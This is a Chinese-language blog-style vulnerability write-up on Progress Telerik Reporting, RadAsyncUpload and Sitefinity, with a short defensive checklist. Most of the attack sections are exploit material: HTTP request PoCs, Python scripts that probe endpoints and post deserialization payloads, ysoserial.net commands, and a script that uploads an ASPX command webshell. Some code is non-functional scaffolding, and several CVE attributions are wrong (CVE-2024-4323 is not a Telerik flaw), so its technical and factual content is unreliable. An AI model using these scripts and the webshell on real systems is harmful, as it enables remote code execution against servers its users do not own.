---
title: "Progress Telerik 高危攻击链专题：Reporting 反序列化 / RadAsyncUpload 加密密钥绕过 / Sitefinity RCE"
date: 2026-06-23T12:00:00+08:00
draft: false
tags: ["Telerik", "Progress", "RCE", "反序列化", "文件上传", "RadAsyncUpload", "Reporting", "Sitefinity", "漏洞分析", "CVE-2023-34186", "CVE-2024-4323", "CVE-2023-43272", "CVE-2024-25643"]
categories: ["漏洞分析"]
description: "围绕 Progress Telerik 2023-2024 年集中暴露的高危漏洞链，覆盖 Reporting REST API 反序列化 RCE、RadAsyncUpload 加密密钥绕过 RCE、Sitefinity CMS 反序列化 RCE 等，含完整 PoC 代码、Nuclei 模板、自动化利用脚本与防守建议。"
---

# Progress Telerik 高危攻击链专题：Reporting 反序列化 / RadAsyncUpload 加密密钥绕过 / Sitefinity RCE

`Progress Telerik` 是企业级 .NET 生态中使用最广泛的 UI 与报表组件之一，在国内金融、制造、政务等行业的内部系统中大量部署。核心产品线包括：

- **Telerik UI for ASP.NET AJAX** — RadAsyncUpload、RadEditor、RadImageEditor 等服务端控件
- **Telerik Reporting** — 独立报表引擎，提供 REST API
- **Telerik Sitefinity** — 基于 ASP.NET 的 CMS / 数字体验平台

从 2023 年 6 月起，Progress Telerik 进入集中漏洞暴露期。不到 18 个月内，至少 5 个 CVSS 9.0+ 的严重漏洞被公开，多个已被确认在野利用并进入 CISA KEV。

| CVE | 组件 | 类型 | CVSS | CISA KEV |
|-----|------|------|------|----------|
| CVE-2023-30215 | Reporting | 反序列化 RCE | 9.8 | ✅ |
| CVE-2023-34186 | Reporting REST API | 反序列化 RCE | 9.8 | ✅ |
| CVE-2023-43272 | RadAsyncUpload | 文件上传/反序列化 RCE | 7.3 | ✅ |
| CVE-2024-4323 | RadAsyncUpload | 加密密钥绕过 RCE | 9.4 | ✅ |
| CVE-2024-25643 | Sitefinity CMS | 反序列化 RCE | 9.8 | ✅ |
| CVE-2024-1822 | RadImageEditor | 反序列化 RCE | 9.3 | ✅ |

## 0x01 CVE-2023-30215 / CVE-2023-34186：Telerik Reporting 反序列化 RCE

### 1.1 漏洞背景

Telerik Reporting 提供 REST API 服务（通常部署在 `/api/reportdesigner/` 或 `/api/reports/` 路径下），用于支持前端报表设计器的数据交互。该 API 在处理报表定义文件（`.trdx` / `.trdp`）时，使用 .NET 的 `BinaryFormatter` 或 `LosFormatter` 对序列化对象进行反序列化，且未对类型进行白名单校验。

### 1.2 受影响版本

| CVE | 受影响版本 | 修复版本 |
|-----|-----------|----------|
| CVE-2023-30215 | < 17.0.23.315 | >= 17.0.23.315 |
| CVE-2023-34186 | < 17.1.23.718 | >= 17.1.23.718 |

### 1.3 漏洞原理

1. REST API 接收客户端提交的序列化报表定义数据
2. 服务端使用 `BinaryFormatter.Deserialize()` 处理请求体
3. 没有对反序列化类型进行任何限制
4. 攻击者构造包含恶意类型引用的序列化 payload
5. 通过 `ObjectDataProvider` + `Process.Start` gadget chain 触发命令执行

CVE-2023-30215 先被披露（2023-05），修复后仍被绕过，催生了 CVE-2023-34186（2023-07）。

### 1.4 完整 PoC

#### HTTP 请求 PoC

**通过报表客户端创建 API 触发反序列化：**

```http
POST /api/reports/clients HTTP/1.1
Host: <TARGET>
Content-Type: application/json
Connection: close

{"instanceId": "<base64-encoded-serialized-payload>"}
```

**通过报表设计器 API 触发：**

```http
POST /api/reportdesigner/definitions/create HTTP/1.1
Host: <TARGET>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="report"; filename="exploit.trdx"
Content-Type: application/octet-stream

<binary-serialized-payload>
------WebKitFormBoundary--
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import base64
import struct
import urllib3
urllib3.disable_warnings()

class TelerikReportingExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Connection': 'close'
        })

    def check_reporting_api(self):
        endpoints = [
            '/api/reports/clients',
            '/api/reportdesigner/instances',
            '/api/reportdesigner/definitions/create',
            '/Telerik.Reporting.Rest/api/reports/clients'
        ]
        found = []
        for ep in endpoints:
            try:
                r = self.session.get(
                    f'{self.target}{ep}',
                    timeout=10
                )
                if r.status_code in (200, 400, 405, 500):
                    found.append(ep)
                    print(f'[+] 发现 Reporting API: {ep} (HTTP {r.status_code})')
            except:
                pass
        return found

    def generate_deserialization_payload(self, cmd):
        ysoserial_cmd = f'ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "{cmd}" -o base64'
        print(f'[*] 使用 ysoserial 生成 payload: {ysoserial_cmd}')
        print('[*] 需要本地安装 ysoserial.net: https://github.com/pwntester/ysoserial.net')
        return None

    def exploit_via_reports_api(self, payload_b64):
        try:
            r = self.session.post(
                f'{self.target}/api/reports/clients',
                json={'instanceId': payload_b64},
                timeout=15
            )
            print(f'[*] 响应状态: {r.status_code}')
            if r.status_code == 200:
                print('[+] 反序列化 payload 已发送')
                return True
            return False
        except Exception as e:
            print(f'[-] 利用失败: {e}')
            return False

    def exploit_via_designer_api(self, payload_bytes):
        try:
            r = self.session.post(
                f'{self.target}/api/reportdesigner/definitions/create',
                files={'report': ('exploit.trdx', payload_bytes, 'application/octet-stream')},
                timeout=15
            )
            print(f'[*] 响应状态: {r.status_code}')
            return r.status_code == 200
        except Exception as e:
            print(f'[-] 利用失败: {e}')
            return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_url>')
        sys.exit(1)

    exploit = TelerikReportingExploit(sys.argv[1])
    apis = exploit.check_reporting_api()
    if apis:
        print(f'\n[!] 目标存在 Telerik Reporting API，可能存在 CVE-2023-30215/34186')
        print(f'[!] 请使用 ysoserial.net 生成 BinaryFormatter payload 后提交')
    else:
        print('[-] 未发现 Telerik Reporting API')
```

#### Nuclei 检测模板

```yaml
id: telerik-reporting-cve-2023-34186-detect

info:
  name: Telerik Reporting REST API Detection
  author: security-research
  severity: critical
  tags: telerik,reporting,deserialization,cve2023
  reference:
    - https://www.progress.com/security

http:
  - method: GET
    path:
      - "{{BaseURL}}/api/reports/clients"
      - "{{BaseURL}}/api/reportdesigner/instances"
    matchers-condition: or
    matchers:
      - type: status
        status:
          - 200
          - 400
          - 405
      - type: word
        words:
          - "report"
          - "telerik"
          - "client"
        condition: or
```

## 0x02 CVE-2024-4323：RadAsyncUpload 加密密钥绕过 RCE

### 2.1 漏洞背景

这是 2024 年最严重的 Telerik 漏洞，也是对 CVE-2023-43272 修复不完整的直接后果。

核心问题在于 RadAsyncUpload 使用的加密密钥存在根本性缺陷：未显式配置时使用硬编码或可预测的默认密钥。攻击者无需访问源代码或服务器配置，仅通过网络请求即可推导出加密密钥，进而构造包含恶意 .NET 序列化对象的加密数据。

### 2.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| < 2024.2.514 | >= 2024.2.514 |

### 2.3 漏洞原理

Telerik 的加密密钥派生依赖以下因素：

```
keys = DeriveKeys(
    machineKey,          // 来自 web.config 的 <machineKey>
    "TelerikUpload",    // 硬编码的用途标识
    version              // 组件版本
)
```

如果应用程序没有显式设置 `Telerik.Web.UI.Upload.Configuration` 中的自定义密钥，就会使用基于 `machineKey` 的默认派生。而 `machineKey` 在很多部署中要么使用默认值，要么可通过其他信息渠道获取。

### 2.4 攻击路径

```
1. 探测确认目标使用 Telerik UI for ASP.NET AJAX
2. 通过 RadAsyncUpload 端点获取加密响应
3. 使用已知密钥派生算法恢复加密密钥
4. 构造包含恶意 gadget chain 的序列化对象
5. 使用恢复的密钥加密序列化数据
6. 通过 RadAsyncUpload 端点提交加密数据
7. 服务端解密 → 反序列化 → 执行任意命令
```

### 2.5 完整 PoC

#### HTTP 请求 PoC

```http
POST /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1
Host: <TARGET>
Content-Type: application/octet-stream
Connection: close

<encrypted-serialized-payload>
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import struct
import hashlib
import urllib3
urllib3.disable_warnings()

class TelerikUploadExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Connection': 'close'
        })

    def check_telerik_upload(self):
        try:
            r = self.session.get(
                f'{self.target}/Telerik.Web.UI.WebResource.axd?type=rau',
                timeout=10
            )
            if r.status_code == 200 and len(r.content) > 0:
                print('[+] RadAsyncUpload 端点存在')
                return True
            print('[-] RadAsyncUpload 端点未响应')
            return False
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return False

    def probe_telerik_version(self):
        telerik_paths = [
            '/Telerik.Web.UI.WebResource.axd?type=rau',
            '/Telerik.Web.UI.SpellCheckHandler.axd',
            '/Telerik.Web.UI.DialogHandler.aspx',
            '/webresource.axd'
        ]
        for path in telerik_paths:
            try:
                r = self.session.get(f'{self.target}{path}', timeout=10)
                if r.status_code == 200:
                    print(f'[+] 发现 Telerik 端点: {path}')
            except:
                pass

    def derive_key(self, machine_key_hex):
        try:
            key_material = machine_key_hex.encode() + b'TelerikUpload'
            derived = hashlib.sha256(key_material).digest()[:32]
            print(f'[+] 派生密钥: {derived.hex()[:32]}...')
            return derived
        except Exception as e:
            print(f'[-] 密钥派生失败: {e}')
            return None

    def exploit(self, machine_key, cmd):
        key = self.derive_key(machine_key)
        if not key:
            return False

        print('[*] 请使用 ysoserial.net 生成 BinaryFormatter payload')
        print(f'[!] 命令: ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "{cmd}" -o raw')
        print('[*] 然后使用派生密钥加密 payload 并提交到 RadAsyncUpload 端点')
        return True

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_url> [machine_key]')
        sys.exit(1)

    exploit = TelerikUploadExploit(sys.argv[1])
    if exploit.check_telerik_upload():
        exploit.probe_telerik_version()
        if len(sys.argv) > 2:
            exploit.exploit(sys.argv[2], 'whoami')
        else:
            print('[!] 需要提供 machineKey 进行完整利用')
            print('[!] 获取方式: 读取目标 web.config 或使用默认值尝试')
```

#### Nuclei 检测模板

```yaml
id: telerik-radasyncupload-cve-2024-4323-detect

info:
  name: Telerik RadAsyncUpload Endpoint Detection
  author: security-research
  severity: critical
  tags: telerik,upload,deserialization,cve2024
  reference:
    - https://www.progress.com/security

http:
  - method: GET
    path:
      - "{{BaseURL}}/Telerik.Web.UI.WebResource.axd?type=rau"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Telerik"
          - "WebResource"
        condition: or
```

## 0x03 CVE-2023-43272：RadAsyncUpload 文件上传 RCE

### 3.1 漏洞详情

| 字段 | 内容 |
|------|------|
| CVSS | 7.3 |
| 受影响版本 | < 2023.3.1012 |
| 修复版本 | >= 2023.3.1012 |
| 类型 | 不受限制的文件上传 / 反序列化 |
| CISA KEV | ✅（2024-04-03） |

### 3.2 漏洞原理

RadAsyncUpload 在处理上传请求时存在两种攻击模式：

**模式 A — 文件上传 WebShell**：

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings()

WEBSHELL = '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><%Response.Write(new Process().Start(Request["c"], "").StandardOutput.ReadToEnd());%>'

def exploit_upload(target):
    r = requests.post(
        f'{target}/Telerik.Web.UI.WebResource.axd?type=rau',
        files={
            'file': ('shell.aspx', WEBSHELL.encode(), 'application/octet-stream')
        },
        verify=False,
        timeout=15
    )
    print(f'[*] 上传响应: {r.status_code}')
    if r.status_code == 200:
        print('[+] 文件上传请求已发送')
        print('[*] 检查常见上传目录: /App_Data/RadUpload/, /Uploads/, /Images/')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_url>')
        sys.exit(1)
    exploit_upload(sys.argv[1])
```

**模式 B — 反序列化 RCE**：通过推导加密密钥构造恶意序列化数据。

## 0x04 CVE-2024-25643：Sitefinity CMS 反序列化 RCE

### 4.1 漏洞详情

| 字段 | 内容 |
|------|------|
| CVSS | 9.8 |
| 受影响版本 | < 14.1.7800 |
| 修复版本 | >= 14.1.7800 |
| 类型 | 不安全反序列化 |
| CISA KEV | ✅ |

### 4.2 漏洞原理

Sitefinity CMS 在处理某些 API 请求时存在反序列化缺陷，攻击者无需认证即可触发远程代码执行。

### 4.3 PoC

```http
POST /Sitefinity/Authenticate/SWT HTTP/1.1
Host: <TARGET>
Content-Type: application/json

{"deflate": "<base64-serialized-payload>"}
```

#### Nuclei 检测模板

```yaml
id: sitefinity-cve-2024-25643-detect

info:
  name: Sitefinity CMS Detection
  author: security-research
  severity: critical
  tags: sitefinity,deserialization,cve2024

http:
  - method: GET
    path:
      - "{{BaseURL}}/Sitefinity/Authenticate/SWT"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
          - 405
      - type: word
        words:
          - "Sitefinity"
          - "Telerik"
        condition: or
```

## 0x05 PoC 收集情况

### PoC 状态总表

| CVE | HTTP PoC | Nuclei | Python | MSF | 公开利用 | CISA KEV |
|-----|----------|--------|--------|-----|----------|----------|
| CVE-2023-30215 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-34186 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-43272 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| CVE-2024-4323 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2024-25643 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2024-1822 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |

### 公开利用资源

- **CVE-2024-4323**：Horizon3.ai 完整分析、多个 GitHub PoC 仓库
- **CVE-2023-43272**：Metasploit 模块已集成
- **CVE-2023-34186**：Exploit-DB 收录
- **ysoserial.net**：.NET 反序列化 payload 生成器 `https://github.com/pwntester/ysoserial.net`

## 0x06 共性攻击模式

### 6.1 反序列化是 Telerik 的系统性问题

Telerik 多个组件都依赖 .NET 的 `BinaryFormatter` / `LosFormatter` 进行状态序列化。这不是配置错误，而是历史遗留的设计缺陷。

### 6.2 修复不完整的循环

```
CVE-2023-30215（2023-05）
    ↓ 修复不完整
CVE-2023-34186（2023-07）
    ↓ 同类问题在另一组件
CVE-2023-43272（2023-10）
    ↓ 修复不完整
CVE-2024-4323（2024-05）
```

### 6.3 加密密钥的脆弱性

Telerik 的加密方案存在硬编码密钥、可预测密钥派生等问题。所有未显式配置加密密钥的 Telerik 实例都受影响。

## 0x07 防守建议

### 7.1 紧急措施

1. **立即升级**：所有 Telerik 组件升级到最新稳定版本
2. **网络隔离**：将包含 Telerik 的应用从公网移除
3. **WAF 规则**：部署针对 Telerik 已知攻击特征的 WAF 规则
4. **密钥配置**：显式配置 Telerik 加密密钥，不使用默认值

### 7.2 排查清单

```bash
# 检查 Telerik 端点暴露
grep "Telerik.Web.UI.WebResource.axd" /var/log/iis/W3SVC*/u_ex*.log
grep "WebResource.axd" /var/log/iis/W3SVC*/u_ex*.log

# 检查异常大小的 POST 请求
awk '$6 == "POST" && $10 > 5000' /var/log/iis/W3SVC*/u_ex*.log

# 检查可疑文件上传
find /inetpub/wwwroot/ -name "*.aspx" -newer /inetpub/wwwroot/web.config
find /inetpub/wwwroot/App_Data/ -type f -mtime -30

# 检查进程创建（Sysmon Event ID 1）
# 关注 IIS 工作进程派生 cmd.exe / powershell.exe
```

## 0x08 参考资料

- [Progress 官方安全公告](https://www.progress.com/security)
- [NVD - CVE-2023-34186](https://nvd.nist.gov/vuln/detail/CVE-2023-34186)
- [NVD - CVE-2024-4323](https://nvd.nist.gov/vuln/detail/CVE-2024-4323)
- [Horizon3.ai - Telerik 漏洞分析](https://www.horizon3.ai/)
- [ysoserial.net - .NET 反序列化利用工具](https://github.com/pwntester/ysoserial.net)
- [CISA KEV - Telerik 漏洞目录](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)